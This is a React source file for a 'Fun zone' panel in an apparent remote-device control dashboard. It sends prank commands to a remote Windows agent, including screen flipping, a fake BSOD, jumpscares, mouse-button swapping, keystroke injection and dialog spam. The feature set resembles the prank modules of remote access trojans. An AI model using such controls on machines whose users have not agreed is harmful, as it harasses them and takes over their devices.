import { useState } from "react";
import { useRelaySocket } from "@/lib/relay";
import { useDeviceCommands } from "@/hooks/use-device-commands";
import { toast } from "sonner";
import {
  PartyPopper, FlipHorizontal2, Contrast, Activity, MonitorX, Ghost,
  Volume2, Megaphone, Music, MousePointerClick, Move3d, Repeat, Type, Keyboard,
  Bell, MessageSquare, ImageIcon, Globe, MinusSquare, Disc3, OctagonX,
  Zap, Play, Square,
  LucideIcon,
} from "lucide-react";


/**
 * Fun / prank tab — fires `fun.*` actions on the remote agent.
 * Every card is fire-and-forget: the agent spawns a detached PowerShell so
 * many can run concurrently. The big red "Stop everything" hammer at the top
 * kills every in-flight prank by terminating PS processes tagged SENTINEL_FUN.
 */

type Field =
  | { kind: "duration"; key: "duration_secs"; label: string; min: number; max: number; default: number }
  | { kind: "count"; key: "count"; label: string; min: number; max: number; default: number }
  | { kind: "text"; key: "text" | "title" | "body"; label: string; placeholder: string; default?: string }
  | { kind: "url"; key: "url"; label: string; placeholder: string }
  | { kind: "angle"; key: "angle"; label: string };

type Action = {
  action: string;
  icon: LucideIcon;
  label: string;
  hint: string;
  danger?: boolean;
  fields?: Field[];
};

const SECTIONS: Array<{ title: string; tint: string; items: Action[] }> = [
  {
    title: "Screen",
    tint: "from-fuchsia-500/15 to-transparent",
    items: [
      { action: "fun.screen.flip", icon: FlipHorizontal2, label: "Flip screen", hint: "Rotates the display.", fields: [{ kind: "angle", key: "angle", label: "Angle" }] },
      { action: "fun.screen.invert", icon: Contrast, label: "Invert colors", hint: "Toggles Windows Magnifier color inversion." },
      { action: "fun.screen.shake", icon: Activity, label: "Screen shake", hint: "Jitters cursor.", fields: [{ kind: "duration", key: "duration_secs", label: "Seconds", min: 1, max: 60, default: 5 }] },
      { action: "fun.screen.bsod", icon: MonitorX, label: "Fake BSOD", hint: "Fullscreen blue panic screen.", danger: true, fields: [{ kind: "duration", key: "duration_secs", label: "Seconds", min: 3, max: 120, default: 15 }] },
      { action: "fun.screen.jumpscare", icon: Ghost, label: "Jumpscare", hint: "Fullscreen image + loud sound for 2s.", fields: [{ kind: "url", key: "url", label: "Image URL", placeholder: "https://…/scary.jpg" }] },
    ],
  },
  {
    title: "Audio",
    tint: "from-amber-500/15 to-transparent",
    items: [
      { action: "fun.audio.tts", icon: Volume2, label: "Make it talk", hint: "Windows TTS speaks the text.", fields: [{ kind: "text", key: "text", label: "Text", placeholder: "I see you" }] },
      { action: "fun.audio.beep", icon: Megaphone, label: "Beep loop", hint: "Console beeps for N seconds.", fields: [{ kind: "duration", key: "duration_secs", label: "Seconds", min: 1, max: 60, default: 5 }] },
      { action: "fun.audio.scream", icon: Music, label: "Scream loop", hint: "Loops Windows critical-stop sound.", danger: true, fields: [{ kind: "duration", key: "duration_secs", label: "Seconds", min: 1, max: 60, default: 5 }] },
    ],
  },
  {
    title: "Input",
    tint: "from-emerald-500/15 to-transparent",
    items: [
      { action: "fun.input.drunkenmouse", icon: MousePointerClick, label: "Drunken mouse", hint: "Wobbles cursor in a sine wave.", fields: [{ kind: "duration", key: "duration_secs", label: "Seconds", min: 1, max: 60, default: 10 }] },
      { action: "fun.input.teleport", icon: Move3d, label: "Cursor teleport", hint: "Snaps cursor to random spots.", fields: [{ kind: "duration", key: "duration_secs", label: "Seconds", min: 1, max: 60, default: 10 }] },
      { action: "fun.input.swapbuttons", icon: Repeat, label: "Swap mouse buttons", hint: "Left↔Right click. Run again with swap=false to undo." },
      { action: "fun.input.typestring", icon: Type, label: "Type into focused app", hint: "SendKeys to whatever has focus.", fields: [{ kind: "text", key: "text", label: "Text", placeholder: "hello there" }] },
      { action: "fun.input.keymash", icon: Keyboard, label: "Random keymash", hint: "Mashes random keys for N seconds.", fields: [{ kind: "duration", key: "duration_secs", label: "Seconds", min: 1, max: 30, default: 5 }] },
    ],
  },
  {
    title: "Window / System",
    tint: "from-sky-500/15 to-transparent",
    items: [
      { action: "fun.window.toastspam", icon: Bell, label: "Toast spam", hint: "Pops N Windows toast warnings.", fields: [
        { kind: "count", key: "count", label: "Count", min: 1, max: 50, default: 10 },
        { kind: "text", key: "title", label: "Title", placeholder: "Warning" },
        { kind: "text", key: "body", label: "Body", placeholder: "Something went wrong" },
      ] },
      { action: "fun.window.msgbox", icon: MessageSquare, label: "Error box spam", hint: "Pops blocking MessageBox dialogs.", fields: [
        { kind: "count", key: "count", label: "Count", min: 1, max: 20, default: 3 },
        { kind: "text", key: "title", label: "Title", placeholder: "System Error" },
        { kind: "text", key: "text", label: "Body", placeholder: "Error 0x80004005" },
      ] },
      { action: "fun.window.wallpaper", icon: ImageIcon, label: "Set wallpaper", hint: "Downloads image and sets as desktop wallpaper.", fields: [{ kind: "url", key: "url", label: "Image URL", placeholder: "https://…/wall.jpg" }] },
      { action: "fun.window.opentabs", icon: Globe, label: "Open browser tabs", hint: "Opens default browser to URL N times.", fields: [
        { kind: "url", key: "url", label: "URL", placeholder: "https://example.com" },
        { kind: "count", key: "count", label: "Count", min: 1, max: 30, default: 10 },
      ] },
      { action: "fun.window.minimizeall", icon: MinusSquare, label: "Minimize everything", hint: "Win+D-style minimize all." },
      { action: "fun.window.ejectcd", icon: Disc3, label: "Eject CD tray", hint: "It's 2026 but the API still works." },
    ],
  },
];

export function FunPanel({ deviceId }: { deviceId: string }) {
  const { send: httpSend, connected: rtConnected } = useDeviceCommands(deviceId);
  const { send: relaySend, connected: relayConnected } = useRelaySocket(deviceId);

  const fire = async (action: string, payload: Record<string, unknown>) => {
    // Prefer relay (no DB round-trip) and mirror to HTTP fallback so the
    // result still lands in the commands table for audit / offline replay.
    if (relayConnected) {
      relaySend({ type: "cmd", payload: { action, ...payload } });
      toast.success(`fired ${action.replace(/^fun\./, "")} (relay)`);
      return;
    }
    try {
      const row = await httpSend(action, payload, 15000);
      if (row.status === "error") toast.error(row.error || "agent error");
      else toast.success(`fired ${action.replace(/^fun\./, "")} (http)`);
    } catch (e: any) {
      toast.error(e?.message ?? "command failed");
    }
  };

  const stopAll = () => fire("fun.stop", {});

  return (
    <div className="space-y-6">
      <div className="flex flex-wrap items-center justify-between gap-3 rounded-xl border border-border/60 bg-card/60 px-4 py-3 backdrop-blur-xl">
        <div className="flex items-center gap-2">
          <PartyPopper className="h-5 w-5 text-fuchsia-400" />
          <div>
            <div className="text-sm font-semibold">Fun zone</div>
            <div className="text-[11px] text-muted-foreground">
              Pranks fire instantly. Multiple can run at once. Stop kills them all.
            </div>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <span className={`inline-flex items-center gap-1 rounded border px-2 py-0.5 text-[10px] uppercase tracking-wide ${
            relayConnected
              ? "border-emerald-500/40 bg-emerald-500/10 text-emerald-300"
              : rtConnected
              ? "border-amber-500/40 bg-amber-500/10 text-amber-300"
              : "border-red-500/40 bg-red-500/10 text-red-300"
          }`}>
            {relayConnected ? "relay" : rtConnected ? "http fallback" : "offline"}
          </span>
          <button
            onClick={stopAll}
            className="inline-flex items-center gap-2 rounded-md bg-destructive px-3 py-1.5 text-sm font-medium text-destructive-foreground hover:opacity-90"
          >
            <OctagonX className="h-4 w-4" /> Stop everything
          </button>
        </div>
      </div>

      {SECTIONS.map((section) => (
        <section key={section.title} className="space-y-3">
          <h2 className="text-sm font-semibold uppercase tracking-wider text-muted-foreground">
            {section.title}
          </h2>
          <div className={`grid gap-3 rounded-xl border border-border/60 bg-gradient-to-br ${section.tint} p-3 sm:grid-cols-2 lg:grid-cols-3`}>
            {section.items.map((a) => (
              <ActionCard key={a.action} action={a} onFire={fire} />
            ))}
          </div>
        </section>
      ))}
    </div>
  );
}

function ActionCard({ action, onFire }: { action: Action; onFire: (a: string, p: Record<string, unknown>) => void }) {
  const Icon = action.icon;
  const [open, setOpen] = useState(false);
  const [values, setValues] = useState<Record<string, unknown>>(() => {
    const out: Record<string, unknown> = {};
    for (const f of action.fields ?? []) {
      if (f.kind === "duration" || f.kind === "count") out[f.key] = f.default;
      else if (f.kind === "text") out[f.key] = f.default ?? "";
      else if (f.kind === "url") out[f.key] = "";
      else if (f.kind === "angle") out[f.key] = 180;
    }
    return out;
  });

  const run = () => {
    onFire(action.action, values);
    setOpen(false);
  };

  const hasFields = !!action.fields?.length;

  return (
    <div className={`group relative flex flex-col gap-2 rounded-lg border bg-card/70 p-3 backdrop-blur-md transition hover:border-primary/40 hover:bg-card ${
      action.danger ? "border-red-500/40" : "border-border/60"
    }`}>
      <div className="flex items-start gap-2.5">
        <div className={`rounded-md p-1.5 ${action.danger ? "bg-red-500/15 text-red-300" : "bg-primary/10 text-primary"}`}>
          <Icon className="h-4 w-4" />
        </div>
        <div className="min-w-0 flex-1">
          <div className="truncate text-sm font-medium">{action.label}</div>
          <div className="line-clamp-2 text-[11px] text-muted-foreground">{action.hint}</div>
        </div>
      </div>

      {hasFields && open && (
        <div className="space-y-2 rounded-md border border-border/60 bg-background/50 p-2">
          {action.fields!.map((f) => (
            <FieldInput
              key={f.key}
              field={f}
              value={values[f.key]}
              onChange={(v) => setValues((s) => ({ ...s, [f.key]: v }))}
            />
          ))}
        </div>
      )}

      <div className="flex gap-2">
        {hasFields && (
          <button
            onClick={() => setOpen((v) => !v)}
            className="rounded-md border border-border/60 px-2 py-1 text-[11px] hover:bg-accent"
          >
            {open ? "Hide" : "Options"}
          </button>
        )}
        <button
          onClick={run}
          className={`flex-1 rounded-md px-3 py-1 text-xs font-medium transition ${
            action.danger
              ? "bg-red-500/80 text-white hover:bg-red-500"
              : "bg-primary text-primary-foreground hover:opacity-90"
          }`}
        >
          Run
        </button>
      </div>
    </div>
  );
}

function FieldInput({
  field, value, onChange,
}: { field: Field; value: unknown; onChange: (v: unknown) => void }) {
  if (field.kind === "duration" || field.kind === "count") {
    return (
      <label className="block">
        <div className="mb-0.5 flex items-center justify-between text-[10px] uppercase tracking-wider text-muted-foreground">
          <span>{field.label}</span>
          <span className="font-mono">{String(value ?? "")}</span>
        </div>
        <input
          type="range"
          min={field.min} max={field.max}
          value={Number(value ?? field.default)}
          onChange={(e) => onChange(Number(e.target.value))}
          className="w-full accent-primary"
        />
      </label>
    );
  }
  if (field.kind === "angle") {
    return (
      <label className="block">
        <div className="mb-0.5 text-[10px] uppercase tracking-wider text-muted-foreground">{field.label}</div>
        <select
          value={Number(value ?? 180)}
          onChange={(e) => onChange(Number(e.target.value))}
          className="w-full rounded-md border border-border bg-input px-2 py-1 text-xs"
        >
          <option value={0}>0° (reset)</option>
          <option value={90}>90°</option>
          <option value={180}>180° (upside down)</option>
          <option value={270}>270°</option>
        </select>
      </label>
    );
  }
  // text / url
  return (
    <label className="block">
      <div className="mb-0.5 text-[10px] uppercase tracking-wider text-muted-foreground">{field.label}</div>
      <input
        type={field.kind === "url" ? "url" : "text"}
        value={String(value ?? "")}
        onChange={(e) => onChange(e.target.value)}
        placeholder={"placeholder" in field ? field.placeholder : ""}
        className="w-full rounded-md border border-border bg-input px-2 py-1 text-xs outline-none focus:border-primary"
      />
    </label>
  );
}